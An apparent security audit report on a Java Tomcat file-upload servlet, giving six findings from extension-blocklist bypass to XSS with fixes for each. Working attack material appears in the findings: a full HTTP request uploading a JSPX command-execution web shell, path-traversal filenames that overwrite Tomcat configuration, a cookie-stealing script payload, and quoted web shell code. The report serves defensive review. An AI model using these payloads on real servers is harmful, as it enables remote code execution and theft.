## Finding 1: File Extension Blocklist Bypass → Remote Code Execution

**File:** `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** 27–34
**CWE:** CWE-434 — Unrestricted Upload of File with Dangerous Type
**OWASP Category:** A03:2021 – Injection / A01:2021 – Broken Access Control
**Priority:** P1
**Severity:** CRITICAL
**Confidence:** HIGH

### Vulnerable Code
```java
String fileName = filePart.getSubmittedFileName();

if (fileName.toLowerCase().endsWith(".jsp")) {
    response.setContentType("text/html");
    PrintWriter out = response.getWriter();
    out.println("<html><body><h2>Error: .jsp files are not allowed!</h2><p><a href=\"/\">Go back</a></p></body></html>");
    return;
}
```

### Description
The extension check is a single-extension blocklist that only rejects `.jsp`. Tomcat 9.0 natively executes **`.jspx`** (JSP XML syntax), **`.jspf`** (JSP fragments), **`.jsw`**, and **`.jsv`** as server-side code — none of which are blocked. Because uploaded files land in `{webroot}/uploads/` (a web-accessible directory — see Finding 4), an attacker can upload a JSPX web shell and trigger execution with a single GET request. The `shell.jspx` already present in this repository is precisely the payload for this attack. No authentication is required on the upload endpoint (see Finding 5).

### Prioritization
Highest-priority finding. Zero preconditions beyond network access. Complete, immediate, unauthenticated RCE from a single POST request followed by a GET.

### Exploitability Notes
- **Exploit Preconditions:** Network access to `POST /upload`. No authentication required. Tomcat must not have `jspx` mapped away from its default JSP processor (default Tomcat mapping includes it).
- **Uncertainty Boundary:** A custom `web.xml` `<mime-mapping>` or security manager policy could reduce impact, but neither is present in this scope and Tomcat's defaults execute `.jspx`.

**Concrete attack:**
```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----X

------X
Content-Disposition: form-data; name="file"; filename="evil.jspx"
Content-Type: application/octet-stream

<jsp:root xmlns:jsp="http://java.sun.com/JSP/Page" version="2.0">
<jsp:scriptlet><![CDATA[
  Runtime.getRuntime().exec(request.getParameter("cmd"));
]]></jsp:scriptlet>
</jsp:root>
------X--

# Then: GET /uploads/evil.jspx?cmd=id
```

### Remediation
Replace the single-extension blocklist with a strict **allowlist** of safe extensions. Never use a blocklist for file type validation — every omitted extension is a bypass.

```java
// After — allowlist approach
private static final Set<String> ALLOWED_EXTENSIONS = new HashSet<>(
    Arrays.asList("txt", "png", "jpg", "jpeg", "gif", "pdf")
);

String fileName = filePart.getSubmittedFileName();
String extension = "";
int dotIndex = fileName.lastIndexOf('.');
if (dotIndex >= 0) {
    extension = fileName.substring(dotIndex + 1).toLowerCase();
}

if (!ALLOWED_EXTENSIONS.contains(extension)) {
    response.sendError(HttpServletResponse.SC_BAD_REQUEST, "File type not permitted.");
    return;
}
```

Additionally, validate the **MIME type** from the `Part` (though it can also be spoofed) and consider reading the first bytes to verify file magic/content type. The allowlist is the non-negotiable control.

### References
- https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload
- https://cwe.mitre.org/data/definitions/434.html

## Finding 2: Path Traversal in Filename → Arbitrary File Write → Remote Code Execution

**File:** `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** 27, 42
**CWE:** CWE-22 — Improper Limitation of a Pathname to a Restricted Directory
**OWASP Category:** A01:2021 – Broken Access Control
**Priority:** P1
**Severity:** CRITICAL
**Confidence:** HIGH

### Vulnerable Code
```java
String fileName = filePart.getSubmittedFileName();
// ... no path sanitization ...
File file = new File(uploadDir, fileName);
```

### Description
`getSubmittedFileName()` returns the attacker-supplied `filename=` field from the `Content-Disposition` header verbatim. Java's `new File(base, child)` resolves `../` sequences — if `fileName` is `../../webapps/ROOT/evil.jspx`, the resolved path escapes the `uploads/` directory entirely and writes to the Tomcat webroot. An attacker can overwrite any file the Tomcat process has write permission to, or write new files anywhere on the filesystem reachable by the JVM process. Combined with the extension bypass in Finding 1, this allows writing a web shell directly to the root context rather than the `uploads/` subdirectory.

### Prioritization
Co-equal with Finding 1 as P1 CRITICAL. Even if the extension filter were fixed correctly, path traversal would allow writing files to privileged locations (e.g., `WEB-INF/web.xml`, Tomcat configuration, or cron directories).

### Exploitability Notes
- **Exploit Preconditions:** Network access to `POST /upload`. Tomcat process must have write permission to the target path. On Docker with the default `tomcat` user, write access to `webapps/ROOT/` is typical.
- **Uncertainty Boundary:** OS-level path restrictions or SELinux/AppArmor policies could limit write targets; neither is configured in the Dockerfile.

**Concrete attack:**
```
filename="../../evil.jspx"
# Resolves to: {webroot}/evil.jspx  (one level up from uploads/)
# Or:
filename="../../../conf/context.xml"
# Overwrites Tomcat configuration
```

**Counterfactual:** Canonicalizing the path and asserting it starts within `uploadDir` makes this finding invalid.

### Remediation
```java
import java.nio.file.Path;
import java.nio.file.Paths;

// Strip any directory components from the submitted name first
String rawName = filePart.getSubmittedFileName();
String fileName = Paths.get(rawName).getFileName().toString(); // strips path separators

// Then canonicalize and assert the resolved path stays inside uploadDir
Path uploadBase = Paths.get(uploadDir).toRealPath();
Path target = uploadBase.resolve(fileName).normalize();

if (!target.startsWith(uploadBase)) {
    response.sendError(HttpServletResponse.SC_BAD_REQUEST, "Invalid filename.");
    return;
}

File file = target.toFile();
```

`Paths.get(rawName).getFileName()` strips all directory components (including `../`, `..\\`, and URL-encoded variants that `getSubmittedFileName()` may decode). The subsequent `normalize()` + `startsWith()` is belt-and-suspenders confirmation.

### References
- https://owasp.org/www-community/attacks/Path_Traversal
- https://cwe.mitre.org/data/definitions/22.html

## Finding 3: Web Shell Files Committed to Repository

**File:** `webshell.jsp` (lines 1–22), `shell.jspx` (lines 1–22)
**Lines:** 9–20 (`webshell.jsp`), 6–20 (`shell.jspx`)
**CWE:** CWE-829 — Inclusion of Functionality from Untrusted Control Sphere / CWE-78 — OS Command Injection
**OWASP Category:** A03:2021 – Injection
**Priority:** P1
**Severity:** CRITICAL
**Confidence:** HIGH

### Vulnerable Code
```java
// webshell.jsp lines 9–11
if (request.getParameter("cmd") != null) {
        out.println("Command: " + request.getParameter("cmd") + "<BR>");
        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
```

```java
// shell.jspx lines 6–9
String tmp = pageContext.getRequest().getParameter("cmd");
if (tmp != null&&!"".equals(tmp)) {
try{
    Process p = Runtime.getRuntime().exec(tmp);
```

### Description
Two fully functional OS command-execution web shells are committed to the repository. `webshell.jsp` passes the `cmd` HTTP parameter directly to `Runtime.getRuntime().exec()` with no sanitization, authentication, or logging — granting any HTTP client that can reach the file arbitrary OS command execution as the Tomcat user. `shell.jspx` is the JSPX-format equivalent and is the exact payload type that bypasses the extension filter in Finding 1. Although these files are in the repository root (not `src/main/webapp/`) and are therefore **not** included in the Maven WAR build, their presence represents: (a) proof-of-concept payloads for Findings 1–2, (b) a supply-chain risk if an operator manually copies or deploys repo artifacts, and (c) a repository compromise artifact that could expose the attack methodology.

### Prioritization
P1 because the files demonstrate a working end-to-end exploit chain against this application. Even if not deployed by the CI/CD pipeline, their presence in the repository is unacceptable.

### Exploitability Notes
- **Exploit Preconditions:** Files must be accessible via HTTP (not true via the Maven WAR build, but trivially achieved by manually placing them in the webroot, which is exactly what Finding 1 enables).
- **Uncertainty Boundary:** Build pipeline correctly excludes them from the WAR — but Finding 1 provides the delivery mechanism.

### Remediation
Delete both files from the repository immediately and rotate any credentials that may have been accessible from the systems where these shells were tested or deployed:

```bash
git rm webshell.jsp shell.jspx
git commit -m "Remove web shell artifacts"
# If the files were ever deployed, treat the host as compromised and audit audit logs
```

Also add a `.gitignore` pattern or pre-commit hook to reject JSP/JSPX files outside `src/main/webapp/`.

## Finding 4: Reflected XSS via Unencoded Filename in Upload Response

**File:** `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** 55
**CWE:** CWE-79 — Improper Neutralization of Input During Web Page Generation (Reflected XSS)
**OWASP Category:** A03:2021 – Injection
**Priority:** P2
**Severity:** HIGH
**Confidence:** HIGH

### Vulnerable Code
```java
out.println("<p>File Name: " + fileName + "</p>");
```

### Description
The attacker-controlled `fileName` value is written directly into the HTML response body without any HTML encoding. If the `filename=` field in the multipart form contains HTML metacharacters (e.g., `<script>alert(document.cookie)</script>.txt`), the server includes them verbatim in the response page. A victim whose browser renders this response will execute the attacker's script in the application's origin. While POST-based reflected XSS is slightly harder to trigger than GET-based (requires form submission or a CSRF-style delivery), it is exploitable with a crafted form on an attacker-controlled page.

### Prioritization
P2. Requires victim interaction (visiting attacker's page with a form auto-submitted to `/upload`). Lower exploitability than Findings 1–2, but same origin context and no CSRF token protection (see Finding 5).

### Exploitability Notes
- **Exploit Preconditions:** Attacker can direct a victim to a page that auto-submits a multipart POST to `/upload` with a malicious filename. No CSRF token is required (none implemented).
- **Uncertainty Boundary:** Modern browsers apply some POST-based XSS mitigations, but they do not prevent execution in this unambiguous injection context.

**Counterfactual:** HTML-encoding `fileName` before output removes this finding entirely.

### Remediation
```java
// Add dependency: commons-lang3, or use a manual encoder
import org.apache.commons.text.StringEscapeUtils;

// Before (vulnerable):
out.println("<p>File Name: " + fileName + "</p>");

// After (safe):
out.println("<p>File Name: " + StringEscapeUtils.escapeHtml4(fileName) + "</p>");
```

If adding a library dependency is not desirable, at minimum manually escape `<`, `>`, `"`, `'`, and `&`:

```java
private static String escapeHtml(String s) {
    return s.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;");
}

out.println("<p>File Name: " + escapeHtml(fileName) + "</p>");
```

## Finding 5: No Authentication on File Upload Endpoint

**File:** `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** 23–57
**CWE:** CWE-306 — Missing Authentication for Critical Function
**OWASP Category:** A01:2021 – Broken Access Control
**Priority:** P2
**Severity:** HIGH
**Confidence:** MEDIUM

### Vulnerable Code
```java
@Override
protected void doPost(HttpServletRequest request, HttpServletResponse response)
        throws ServletException, IOException {

    Part filePart = request.getPart("file");
    // No session check, no role check, no authentication gate
```

### Description
The `POST /upload` endpoint performs no authentication check before accepting and writing a file. No `HttpSession` validation, no `Principal` check, and no `security-constraint` is visible in this scope. Any unauthenticated attacker on the network can upload arbitrary content. File upload is a high-risk operation even with a correct extension allowlist; requiring authentication is a critical baseline control that provides defense in depth when primary controls fail (as they do here via Findings 1–2).

### Prioritization
P2 — it is a standalone missing control, but its practical exploitability is only meaningful in combination with Findings 1–2. Fix Findings 1–2 first, then add auth as defense in depth.

### Exploitability Notes
- **Exploit Preconditions:** No login or session required at all.
- **Uncertainty Boundary:** A `web.xml` security constraint or a servlet filter not in this scope could enforce authentication at the container level. No such file was provided.

### Remediation
Add a session/principal check at the top of `doPost`, or preferably enforce it via a container `security-constraint` in `web.xml`:

```java
// Option A — in-servlet check
HttpSession session = request.getSession(false);
if (session == null || session.getAttribute("authenticatedUser") == null) {
    response.sendError(HttpServletResponse.SC_UNAUTHORIZED);
    return;
}
```

```xml
<!-- Option B — web.xml security constraint -->
<security-constraint>
  <web-resource-collection>
    <web-resource-name>Upload</web-resource-name>
    <url-pattern>/upload</url-pattern>
    <http-method>POST</http-method>
  </web-resource-collection>
  <auth-constraint>
    <role-name>user</role-name>
  </auth-constraint>
</security-constraint>
```

## Finding 6: Upload Directory Resides Inside Web Root

**File:** `src/main/java/com/home/demo/FileUploadServlet.java`
**Lines:** 36
**CWE:** CWE-552 — Files or Directories Accessible to External Parties
**OWASP Category:** A05:2021 – Security Misconfiguration
**Priority:** P3
**Severity:** MEDIUM
**Confidence:** HIGH

### Vulnerable Code
```java
String uploadDir = getServletContext().getRealPath("") + File.separator + "uploads";
```

### Description
Uploaded files are stored inside the Tomcat web application root (`{webroot}/uploads/`). This makes every uploaded file directly accessible via `GET /uploads/<filename>`. Even if the extension filter were corrected to only allow `.txt` and image files, placing uploads inside the webroot is defense-in-depth failure: a misconfigured MIME type, a Tomcat `DefaultServlet` misconfiguration, or a future filter bypass would immediately expose uploaded files for execution or download. The correct pattern is to store uploads **outside** the webroot and serve them via a controlled servlet that validates access before streaming the file.

### Prioritization
P3 — a compound risk amplifier. Independently MEDIUM. Resolved by moving the storage path; does not block fixing Findings 1–2 first.

### Exploitability Notes
- **Exploit Preconditions:** Files successfully uploaded (itself trivial given Finding 1).
- **Uncertainty Boundary:** A `web.xml` `<servlet-mapping>` that denies serving from `/uploads/` would reduce impact, but is not present.

### Remediation
```java
// Store outside the web root — use a configured path from context-param or env
String uploadDir = System.getProperty("upload.dir", "/var/uploads/challenge16");

// To serve a file later, use a dedicated servlet that validates the path,
// sets Content-Disposition: attachment, and streams the bytes — never serves
// the content in a way that allows server-side execution.
```

Add to `web.xml` to deny direct HTTP access to any `uploads/` directory if it must remain inside the webroot:
```xml
<security-constraint>
  <web-resource-collection>
    <web-resource-name>Uploads</web-resource-name>
    <url-pattern>/uploads/*</url-pattern>
  </web-resource-collection>
  <auth-constraint/>  <!-- deny all -->
</security-constraint>
```

- https://cwe.mitre.org/data/definitions/552.html
